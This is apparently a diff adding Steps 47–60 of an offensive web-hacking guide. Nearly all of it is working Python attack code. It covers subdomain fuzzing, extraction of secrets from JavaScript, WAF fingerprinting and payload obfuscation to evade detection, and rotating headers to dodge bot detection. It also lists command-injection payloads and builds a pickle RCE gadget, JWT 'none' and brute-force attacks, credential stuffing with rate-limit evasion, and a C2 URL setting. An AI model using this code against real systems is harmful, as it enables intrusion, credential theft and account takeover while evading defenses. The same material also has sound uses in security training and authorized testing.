+import dns.resolver                    # dnspython
+
+def resolve_subdomain(sub: str, domain: str) -> str | None:
+    fqdn = f"{sub}.{domain}"
+    try:
+        dns.resolver.resolve(fqdn, "A")
+        return fqdn
+    except Exception:
+        return None
+
+async def subdomain_fuzz(domain: str, wordlist: list[str]):
+    loop = asyncio.get_event_loop()
+    tasks = [loop.run_in_executor(None, resolve_subdomain, w, domain) for w in wordlist]
+    results = await asyncio.gather(*tasks)
+    return [r for r in results if r]
+```
+
+### Step 48 — JavaScript Secret Extraction
+Scraping JS files for hardcoded API keys, tokens, and endpoints.
+```python
+import re
+
+patterns = {
+    "AWS Key":      r"AKIA[0-9A-Z]{16}",
+    "Google API":   r"AIza[0-9A-Za-z\-_]{35}",
+    "JWT":          r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
+    "Private Key":  r"-----BEGIN (?:RSA|EC|OPENSSH) PRIVATE KEY-----",
+    "Bearer Token": r"['\"]Bearer [A-Za-z0-9\-._~+/]+=*['\"]",
+    "Endpoint":     r"['\"/](api/v[0-9]+/[a-zA-Z0-9/_\-]+)['\"/]",
+}
+
+def extract_secrets(js_url: str, session: requests.Session):
+    resp = session.get(js_url)
+    found = {}
+    for name, pattern in patterns.items():
+        matches = re.findall(pattern, resp.text)
+        if matches:
+            found[name] = matches
+    return found
+```
+
+### Step 49 — API Endpoint Mapping
+Discovering and mapping REST API endpoints from JS bundles and Swagger docs.
+```python
+# Parse OpenAPI/Swagger spec
+import json
+
+def parse_swagger(url: str, session: requests.Session) -> list[dict]:
+    for path in ["/swagger.json", "/api-docs", "/openapi.json", "/v2/api-docs"]:
+        resp = session.get(url + path)
+        if resp.status_code == 200:
+            spec = resp.json()
+            endpoints = []
+            for route, methods in spec.get("paths", {}).items():
+                for method in methods:
+                    endpoints.append({"method": method.upper(), "path": route})
+            return endpoints
+    return []
+
+# Extract endpoints from JS source
+def extract_routes_from_js(js_text: str) -> list[str]:
+    return re.findall(r'["\']/(api/[a-zA-Z0-9/_\-{}]+)["\']', js_text)
+```
+
+### Step 50 — Web Crawling & Spidering
+Recursive link extraction — mapping the full attack surface.
+```python
+from collections import deque
+from urllib.parse import urljoin, urlparse
+
+def crawl(start_url: str, session: requests.Session, max_pages=200) -> set[str]:
+    visited, queue = set(), deque([start_url])
+    base = urlparse(start_url).netloc
+
+    while queue and len(visited) < max_pages:
+        url = queue.popleft()
+        if url in visited:
+            continue
+        try:
+            resp = session.get(url, timeout=5)
+            visited.add(url)
+            soup = BeautifulSoup(resp.text, "html.parser")
+            for a in soup.find_all("a", href=True):
+                abs_url = urljoin(url, a["href"])
+                if urlparse(abs_url).netloc == base:
+                    queue.append(abs_url)
+        except Exception:
+            pass
+    return visited
+```
+
+---
+
+## 🟤 Stage 10 — Evasion & Stealth
+> Bypassing WAFs, IDS, and detection mechanisms.
+
+### Step 51 — WAF Detection & Fingerprinting
+Identifying Web Application Firewalls before launching attacks.
+```python
+waf_signatures = {
+    "Cloudflare":   ["cloudflare", "__cfduid", "cf-ray"],
+    "AWS WAF":      ["awswaf", "x-amzn-requestid"],
+    "ModSecurity":  ["mod_security", "NOYB"],
+    "Akamai":       ["akamai", "ak_bmsc"],
+    "Imperva":      ["incap_ses", "visid_incap"],
+}
+
+def detect_waf(url: str, session: requests.Session) -> str | None:
+    resp = session.get(url, params={"id": "' OR 1=1--"})
+    all_headers = str(resp.headers).lower() + resp.text.lower()
+    for waf, sigs in waf_signatures.items():
+        if any(s in all_headers for s in sigs):
+            return waf
+    return None
+```
+
+### Step 52 — Payload Obfuscation & Encoding
+Evading signature-based WAF rules with encoding tricks.
+```python
+from urllib.parse import quote
+
+def obfuscate_sqli(payload: str) -> list[str]:
+    variants = [
+        payload,
+        payload.replace(" ", "/**/"),           # comment substitution
+        payload.replace(" ", "%20"),             # URL encode spaces
+        payload.replace(" ", "+"),
+        payload.upper(),
+        payload.lower(),
+        quote(payload),                          # full URL encode
+        quote(quote(payload)),                   # double encode
+        payload.replace("'", "%27").replace(" ", "%20"),
+    ]
+    return variants
+
+def obfuscate_xss(payload: str) -> list[str]:
+    return [
+        payload,
+        payload.replace("<", "%3C").replace(">", "%3E"),
+        payload.replace("script", "scRiPt"),     # case variation
+        payload.replace("script", "scr\x00ipt"), # null byte
+        payload.replace("alert", "confirm"),
+        payload.replace("alert(1)", "alert`1`"),  # template literals
+    ]
+```
+
+### Step 53 — Request Fingerprint Evasion
+Rotating user agents, headers, timing — avoiding bot detection.
+```python
+import random, time
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
+]
+
+def build_stealth_session(proxy: str = None) -> requests.Session:
+    s = requests.Session()
+    s.headers.update({
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "DNT": "1",
+        "Referer": "https://www.google.com/",
+    })
+    if proxy:
+        s.proxies = {"http": proxy, "https": proxy}
+    return s
+
+def jitter_request(fn, min_ms=200, max_ms=1500):
+    result = fn()
+    time.sleep(random.uniform(min_ms, max_ms) / 1000)
+    return result
+```
+
+### Step 54 — Custom HTTP Client (urllib3)
+Low-level HTTP for crafting non-standard requests that bypass framework-level filters.
+```python
+import urllib3
+
+urllib3.disable_warnings()
+http = urllib3.PoolManager(
+    cert_reqs="CERT_NONE",
+    num_pools=50,
+    maxsize=20,
+    retries=urllib3.Retry(3, backoff_factor=0.5)
+)
+
+# Non-standard method (for bypass testing)
+resp = http.request(
+    "FUZZ",
+    "https://target.com/api/admin",
+    headers={"Content-Type": "application/json"},
+    body=b'{"role":"admin"}'
+)
+
+# HTTP/1.0 downgrade (sometimes bypasses WAF)
+resp = http.request("GET", url, headers={"Connection": "close"}, version=10)
+```
+
+---
+
+## 🔵 Stage 11 — Post-Exploitation via Web
+> Leveraging web vulnerabilities for deeper access.
+
+### Step 55 — Command Injection & RCE
+Exploiting command injection vulnerabilities to achieve remote code execution.
+```python
+cmd_payloads = [
+    "; id",
+    "| id",
+    "& id",
+    "|| id",
+    "&& id",
+    "`id`",
+    "$(id)",
+    "\n/usr/bin/id",
+]
+
+def test_cmdi(url: str, param: str, session: requests.Session):
+    for payload in cmd_payloads:
+        resp = session.get(url, params={param: "test" + payload})
+        if "uid=" in resp.text:
+            print(f"[+] RCE via command injection: {payload}")
+            print(resp.text[:300])
+            return payload
+    return None
+```
+
+### Step 56 — Deserialization Attacks
+Generating and detecting insecure deserialization vulnerabilities.
+```python
+import pickle, base64, os
+
+# Python pickle gadget — PoC only
+class RCEPayload:
+    def __reduce__(self):
+        return (os.system, ("id",))
+
+payload = base64.b64encode(pickle.dumps(RCEPayload())).decode()
+print(f"[*] Pickle payload: {payload}")
+
+# PHP serialization probes
+php_probes = [
+    'O:8:"stdClass":0:{}',
+    'O:4:"User":1:{s:4:"role";s:5:"admin";}',
+]
+
+# Java deserialization marker
+java_marker = b"\xac\xed\x00\x05"   # Java serialized object magic bytes
+
+def detect_java_deser(resp_bytes: bytes) -> bool:
+    return resp_bytes.startswith(java_marker)
+```
+
+### Step 57 — JWT Attacks
+Exploiting JWT vulnerabilities — algorithm confusion, none algorithm, secret brute-force.
+```python
+import jwt, json, base64
+
+def jwt_none_attack(token: str) -> str:
+    """Strip signature — 'none' algorithm attack"""
+    header, payload, _ = token.split(".")
+    header_decoded = json.loads(base64.b64decode(header + "=="))
+    header_decoded["alg"] = "none"
+    new_header = base64.urlsafe_b64encode(
+        json.dumps(header_decoded).encode()
+    ).rstrip(b"=").decode()
+    return f"{new_header}.{payload}."
+
+def brute_jwt_secret(token: str, wordlist: list[str]) -> str | None:
+    for secret in wordlist:
+        try:
+            jwt.decode(token, secret, algorithms=["HS256"])
+            return secret
+        except jwt.InvalidSignatureError:
+            continue
+    return None
+```
+
+### Step 58 — Credential Stuffing & Brute Force
+Automated credential testing with rate-limit evasion.
+```python
+async def credential_stuff(
+    login_url: str,
+    credentials: list[tuple],
+    success_indicator: str,
+    delay_ms: int = 500
+):
+    async with aiohttp.ClientSession() as session:
+        for username, password in credentials:
+            async with session.post(
+                login_url,
+                data={"username": username, "password": password},
+                allow_redirects=False
+            ) as resp:
+                body = await resp.text()
+                if success_indicator in body or resp.status == 302:
+                    print(f"[+] Valid credentials: {username}:{password}")
+                await asyncio.sleep(delay_ms / 1000 + random.uniform(0, 0.3))
+```
+
+---
+
+## ⚙️ Stage 12 — Tool Architecture
+> Building production-quality, modular offensive tools.
+
+### Step 59 — Plugin Architecture
+Modular scanner where each check is a self-contained plugin.
+```python
+from abc import ABC, abstractmethod
+
+class ScanPlugin(ABC):
+    name: str = ""
+    severity: str = "info"
+
+    @abstractmethod
+    def check(self, url: str, session: requests.Session) -> list[dict]: ...
+
+class SQLiPlugin(ScanPlugin):
+    name = "sql-injection"
+    severity = "critical"
+    def check(self, url, session): ...
+
+class XSSPlugin(ScanPlugin):
+    name = "xss"
+    severity = "high"
+    def check(self, url, session): ...
+
+class Scanner:
+    def __init__(self):
+        self.plugins: list[ScanPlugin] = []
+
+    def register(self, plugin: ScanPlugin):
+        self.plugins.append(plugin)
+
+    def run(self, url: str, session: requests.Session):
+        return {p.name: p.check(url, session) for p in self.plugins}
+```
+
+### Step 60 — Configuration & Environment
+Professional tool configuration — YAML/ENV-based, no hardcoded values.
+```python
+import os
+import yaml
+
+# Environment variables
+C2_URL  = os.getenv("C2_URL", "http://127.0.0.1")
+API_KEY = os.getenv("API_KEY", "")
+
+# YAML config
+with open("config.yaml") as f:
+    config = yaml.safe_load(f)
+
+target  = config["target"]["url"]
+threads = config["scan"]["threads"]
+timeout = config["scan"]["timeout"]
+
+# config.yaml structure:
+# target:
+#   url: https://target.com
+# scan:
+#   threads: 50
+#   timeout: 5.0
+#   extensions: [.php, .bak, .old]
+```
+
+---
